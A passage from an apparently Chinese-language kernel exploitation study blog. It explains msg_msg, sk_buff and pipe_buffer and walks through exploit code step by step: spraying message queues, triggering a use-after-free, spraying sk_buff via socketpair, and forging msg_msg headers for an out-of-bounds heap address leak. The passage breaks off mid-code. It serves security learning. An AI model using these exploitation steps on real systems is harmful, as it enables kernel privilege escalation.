class="string">&quot;msgget success msgid:%d\n&quot;</span>, msgid);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;ipcs -q&quot;</span>); <span class="comment">// 通过shell指令&quot;ipcs -q&quot;可以查看消息队列的信息</span></span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123; <span class="comment">/* 父进程,发送消息 */</span></span><br><span class="line">        s_msg.type = <span class="number">0x41</span>;</span><br><span class="line">        <span class="built_in">memset</span>(s_msg.data, <span class="number">0</span>, <span class="keyword">sizeof</span>(s_msg.data));</span><br><span class="line">        <span class="built_in">strncpy</span>(s_msg.data, <span class="string">&quot;yhellow_chunk&quot;</span>, <span class="number">0x20</span>);</span><br><span class="line">        msgsnd(msgid, &amp;s_msg, <span class="built_in">strlen</span>(s_msg.data), <span class="number">0</span>); <span class="comment">// 将消息发送到消息队列</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// 停止目前进程的执行,直到有信号来到或子进程结束</span></span><br><span class="line">        msgctl(msgid, IPC_RMID, <span class="literal">NULL</span>); <span class="comment">// 删除ipc内核对象</span></span><br><span class="line">        system(<span class="string">&quot;ipcs -q&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">/* 子进程,接收消息 */</span></span><br><span class="line">        msgrcv(msgid, &amp;r_msg, <span class="keyword">sizeof</span>(r_msg.data), <span class="number">0x41</span>, IPC_NOWAIT); <span class="comment">// 从消息队列取出消息后,并将其从消息队列里删除</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv msg data type: %ld, data: %s\n&quot;</span>, r_msg.type, r_msg.data);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test               </span><br><span class="line">ftok success key:<span class="number">0x4205274f</span></span><br><span class="line">msgget success msgid:<span class="number">15</span></span><br><span class="line"></span><br><span class="line">--------- 消息队列 -----------</span><br><span class="line">键        msqid      拥有者  权限     已用字节数 消息      </span><br><span class="line"><span class="number">0x4205274f</span> <span class="number">15</span>         yhellow    <span class="number">666</span>        <span class="number">0</span>            <span class="number">0</span>           </span><br><span class="line"></span><br><span class="line">recv msg data type: <span class="number">65</span>, data: yhellow_chunk</span><br><span class="line"></span><br><span class="line">--------- 消息队列 -----------</span><br><span class="line">键        msqid      拥有者  权限     已用字节数 消息</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/528829665">Linux内核消息队列详解</a></p>
<p><strong>socketpair</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socketpair</span><span class="params">(<span class="keyword">int</span> d, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, <span class="keyword">int</span> sv[<span class="number">2</span>])</span>；</span></span><br></pre></td></tr></table></figure>
<ul>
<li>socketpair() 函数用于创建一对无名的、相互连接的套接子（有点类似于管道）</li>
<li>如果函数成功，则返回 “0”，创建好的套接字分别是 sv[0] 和 sv[1]</li>
<li>否则返回 “-1”，错误码保存于 errno 中</li>
</ul>
<p>基本用法： </p>
<ul>
<li>这对套接字可以用于全双工通信，每一个套接字既可以读也可以写（例如，可以往 sv[0] 中写，从 sv[1] 中读，或者从 sv[1] 中写，从 sv[0] 中读）</li>
<li>如果往一个套接字（sv[0]）中写入后，再从该套接字读时会阻塞，只能在另一个套接字中（sv[1]）上读成功</li>
<li>读、写操作可以位于同一个进程，也可以分别位于不同的进程，如父子进程，如果是父子进程时，一般会功能分离，一个进程用来读，一个用来写（因为文件描述副 sv[0] 和 sv[1] 是进程共享的，所以读的进程要关闭写描述符，反之，写的进程关闭读描述符）</li>
</ul>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;error.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socket_pair[<span class="number">2</span>][<span class="number">2</span>]; </span><br><span class="line">    <span class="keyword">pid_t</span> pid; </span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">char</span>* str = <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    <span class="built_in">memset</span>(str, <span class="string">&#x27;a&#x27;</span>, <span class="number">0X20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_pair[i]) == <span class="number">-1</span> ) &#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error, socketpair create failed, errno(%d): %s\n&quot;</span>, errno, strerror(errno));</span><br><span class="line">            <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    size = write(socket_pair[<span class="number">0</span>][<span class="number">0</span>], str, <span class="built_in">strlen</span>(str)); <span class="comment">/* 写入socket_pair[0][0] */</span> </span><br><span class="line">    size = write(socket_pair[<span class="number">1</span>][<span class="number">0</span>], str, <span class="built_in">strlen</span>(str)); <span class="comment">/* 写入socket_pair[1][0] */</span> </span><br><span class="line"></span><br><span class="line">    read(socket_pair[<span class="number">0</span>][<span class="number">1</span>], buf, size); <span class="comment">/* 从socket_pair[0][1]中读入buf */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf result1: %s\n&quot;</span>,buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(str, <span class="string">&#x27;b&#x27;</span>, <span class="number">0X20</span>); <span class="comment">/* 更改原来str中的数据 */</span></span><br><span class="line">    read(socket_pair[<span class="number">1</span>][<span class="number">1</span>], buf, size); <span class="comment">/* 从socket_pair[1][1]中读入buf */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf result2: %s\n&quot;</span>,buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">buf result1: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">buf result2: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现原 str 改变以后，buf 并没有改变，也就是说 socketpair 底层的存储方式不是指针，数据传入 <code>socket_pair[0-1][1]</code> 时就被复制了一份</li>
<li>那么 <code>socket_pair[0-1][1]</code> 中的数据是储存到哪里的呢？</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffb73d</span> <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffde00</span> <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class="line">pwndbg&gt; search -s bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">[heap]          <span class="number">0x4052a0</span> <span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>heap 上没有，那就极有可能在 kernel heap 中</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013">socketpair的用法和理解</a> </p>
<p><strong>sk_buff</strong></p>
<p>结构体 <code>sk_buff</code> 的源码很长，但这里我们只需要注意以下片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="comment">/* These two members must be first. */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">next</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">prev</span>;</span></span><br><span class="line">            ......</span><br><span class="line">	&#125;;</span><br><span class="line">	......</span><br><span class="line">    <span class="keyword">sk_buff_data_t</span>      tail; <span class="comment">/* 指向数据区中实际数据结束的位置 */</span></span><br><span class="line">    <span class="keyword">sk_buff_data_t</span>      end; <span class="comment">/* 指向数据区中结束的位置（非实际数据区域结束位置）*/</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>       *head, <span class="comment">/* 指向数据区中开始的位置（非实际数据区域开始位置）*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>       *data; <span class="comment">/* 指向数据区中实际数据开始的位置 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        truesize; </span><br><span class="line">	<span class="keyword">refcount_t</span>		users;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_ext</span>		*<span class="title">extensions</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
<ul>
<li><code>sk_buff</code>（socket buffer）结构是 linux 网络代码中重要的数据结构，它<strong>管理和控制接收或发送数据包的信息</strong></li>
<li>类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是：<ul>
<li><code>msg_msg</code> 由一个 header 加上用户数据组成</li>
<li>而 <code>sk_buff</code> 本身不包含任何用户数据，用户数据单独存放在一个 object 当中，而 <code>sk_buff</code> 中存放指向用户数据的指针</li>
</ul>
</li>
</ul>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656479312235-1663329194251.png" alt="1656479312235"> </p>
<ul>
<li>sk_buff 在内核网络协议栈中代表一个「包」，我们只需要<strong>创建一对 socke，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong></li>
<li>最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</li>
</ul>
<p><strong>pipe_buffer</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object </li>
<li>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址</li>
</ul>
<hr>
<p>PS：因为本人太菜，所以第一遍只能跟着大佬的 exp 做阅读理解……</p>
<p><strong>Step.I 堆喷 msg_msg，建立主从消息队列</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line"><span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">add();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG; <span class="comment">/* MSG_TAG是一个标志位,后续会用到 */</span></span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">1024</span>) <span class="comment">/* 后续申请secondary_msg时,有极大概率占用这个object */</span></span><br><span class="line">        del();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆喷多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局：</p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656499343488-1663329194251.png" alt="1656499343488"> </p>
<ul>
<li>第一条消息（主消息）的大小为 96</li>
<li>第二条消息（辅助消息）的大小为 0x400</li>
<li>此时我们的辅助消息便有极大的概率获取到之前释放的 object</li>
</ul>
<p><strong>Step.II 构造 UAF，堆喷 sk_buff 定位 victim 队列</strong></p>
<p>虽然辅助消息有极大的概率获取到之前释放的 object，但是我们并不知道是哪一个辅助消息获取了 object（一共有 4096 个辅助消息）</p>
<p>可以通过堆喷 sk_buff 定位 victim 队列，而 sk_buff 的分配与释放则靠 socketpair 完成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spraySkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="comment">/* 利用socketpair完成sk_buff的分配,同时写入fake_secondary_msg */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* skb_shared_info需要在尾部取320字节,所以我们应该发送的buf的最大大小是1024-320=704 */</span></span><br><span class="line"><span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    del(); <span class="comment">/* 释放这个object,然后就会被socketpair申请的kernel heap占用 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 获取了object的辅助消息:msg_msg-&gt;m_ts从&#x27;0x400-0x30&#x27;被改为&#x27;0x400&#x27; */</span></span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* sk_buff分配完毕,获取了object的辅助消息被修改为fake_secondary_msg */</span></span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 因为获取了object的辅助消息被修改,所以使用MSG_COPY flag进行消息拷贝时便会失败,利用这个特性就可以确定该辅助消息的位置 */</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* 把所有的sk_buff释放掉,之后可以再次申请命中UAF的消息队列 */</span></span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>因为 socketpair 使用的也是 kernel heap 的空间，所以前面释放的 object 可能被 sk_buff 分配的空间占用（此时 object 仍然在被 secondary_msg 使用）</li>
<li>获取了 object 的辅助消息被修改为 fake_secondary_msg 后，所以使用 MSG_COPY flag 进行消息拷贝时便会失败</li>
<li>因此我们可以通过判断是否读取消息失败，来定位命中 UAF 的消息队列</li>
</ul>
<p><strong>Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址</strong></p>
<p>用同样的方法，将辅助消息被修改为 fake_secondary_msg，使 <code>msg_msg-&gt;m_ts</code> 变为一个较大值，从而越界读取到相邻辅助消息的 header（msg_msg），泄露出堆上地址</p>
<p>为了捕获正确的 msg_msg，前面设置的 MSG_TAG 标志位就有作用了</p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656586953394-1663329194251.png" alt="1656586953394">       </p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656410685806.png" alt="1656410685806"> </p>
<ul>
<li>由于 slub 算法的特性，kmalloc-1k 会被分配到相邻的内存空间，kmalloc-96 会被分配到相邻的内存空间，两者互不干扰</li>
<li>msg_queue，primary，secondary 通过 <code>primary_msg-&gt;m_list</code> 与 <code>secondary_msg-&gt;m_list</code> 相关联</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 伪造msg_msg-&gt;m_ts为&quot;0x1000-sizeof(struct msg_msg)&quot; */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>); </span><br><span class="line">		<span class="comment">/* 注入fake_secondary_msg */</span></span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>); </span><br><span class="line">		<span class="comment">/* 越界读取到相邻辅助消息的header,泄露对应主消息的地址 */</span></span><br><span class="line">    <span 